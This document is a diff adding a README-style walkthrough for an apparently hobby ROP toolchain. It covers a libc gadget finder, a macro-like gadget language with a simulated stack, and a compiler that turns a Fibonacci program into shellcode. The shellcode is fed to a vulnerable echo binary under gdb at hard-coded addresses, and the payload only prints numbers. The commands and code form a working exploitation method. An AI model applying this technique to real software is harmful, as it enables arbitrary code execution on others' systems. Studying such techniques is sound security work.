@@ -1,0 +1,135 @@
+ROP With a Second Stack
+ -- or, alternatively --
+This Exploit is an Inefficient Fibbonacci Sequence Algorithm 
+
+1. Use my `gadgets' program finds sequences of valid x86_64 instructions in an ELF x86_64 library and dumps out a list of disassembled gadgets.
+
+  $ ./gadgets -o gadgets3.asm -n 3 /lib/libc.so.6
+  bank length = 1353770
+  gadgets found: 5533
+  success!
+
+2. Search for interesting gadgets and symbolically wrap them in symbolic `rules' (analogous to C macros), cataloging these rules in a source file.
+
+   $ less gadgets3.asm           |   $ less mov.gds
+   ...                           |   ...
+   0x0fd9f8: 58    pop     rax   |   MOV rax,imm64 :=
+   0x16c6a7: c3    ret           |       ret &0xfd9f8
+   ...                 		 |       dq imm64
+   ...                           |   ...
+
+3. Building up from simple rules from (2), write pseudo-instructions for a virtual assembly language. Control flow is achieved through manipulating %rsp. Repurposing %rbp as a simulated stack pointer gives ROP shellcode access to a stack, enabling recursion and library calls.
+
+   $ less stack.gds
+   ...
+   ; push ACC (the accumulator) onto the stack
+   PUSH :=
+       MOV rcx,rax
+       MOV rax,rbp
+       ADD rax,-8
+       MOV rdx,rax
+       MOV [rdx],rcx
+       MOV rbp,rax
+       MOV rax,rcx
+   ...
+       
+4. Write the exploit in this virtual assembly language.
+   $ cat fib.gds
+   START:
+     INIT
+     MOV 30
+   LOOP:
+     PUSH
+     CALL FIB_REC  ; fib(5) = ?
+     PUSH
+     PUSH FMT
+     LIBCALL3 <printf>
+     LEAVE 16
+     POP
+     DEC
+     JNE LOOP
+   DONE:
+     PUSH 0
+     MOV SYSCALL_EXIT
+     SYSCALL3
+
+   FIB_REC:
+     PUSH 2
+     CMP     ; ACC < 3 ?
+     JLT FIB_BASE
+     DEC
+     PUT 0          ; save n-1
+     CALL FIB_REC  ; fib(n-1)
+     PUSH
+     GET 8         ; get n-1
+     DEC
+     CALL FIB_REC  ; fib(n-2)
+     ADD           ; fib(n) = fib(n-1) + fib(n-2)
+     LEAVE 8
+     RET
+   
+   FIB_BASE:
+     LEAVE 8
+     RET		; fib(0) = 0; fib(1) = 1
+   
+   FMT:
+     db "%d\n\0"
+
+
+5. Use gdb to find the shellcode injection point (the `origin') and an `anchor' for libc's runtime address.
+   $ gdb echo
+   ...
+   (gdb) b echo
+   Breakpoint 1 at 0x1171: file echo.c, line 11.
+   (gdb) r
+   Breakpoint 1, echo () at echo.c:11
+   11	  if ((nbytes = read(0, buf, BUFSIZE)) < 0) {
+   => 0x0000555555555171 <echo+8>:	48 8d 45 f0	lea    rax,[rbp-0x10]
+   (gdb) p/x $rbp-0x10
+   $1 = 0x7fffffffc7b0
+   (gdb) p sleep
+   $2 = {<text variable, no debug info>} 0x7ffff7eb7570 <sleep>
+
+
+5. Compile the exploit source code to shellcode using `ropc', my ROP compiler.
+   $ ./ropc -b 0x7fffffffc7b0 -p 0x18 -a sleep,0x7ffff7eb7570 -o fib.sc fib.gds support/*.gds 
+   
+6. Launch the attack.
+
+   (gdb) r < fib.sc
+   ?����@�H���?����@&���������JY���4��������������
+   ���O[�������������JY���4��������?������������&����'��������������JY���4��������§
+   ...
+
+   832040
+   514229
+   317811
+   196418
+   121393
+   75025
+   46368
+   28657
+   17711
+   10946
+   6765
+   4181
+   2584
+   1597
+   987
+   610
+   377
+   233
+   144
+   89
+   55
+   34
+   21
+   13
+   8
+   5
+   3
+   2
+   1
+   1
+   [Inferior 1 (process 846) exited normally]
+     
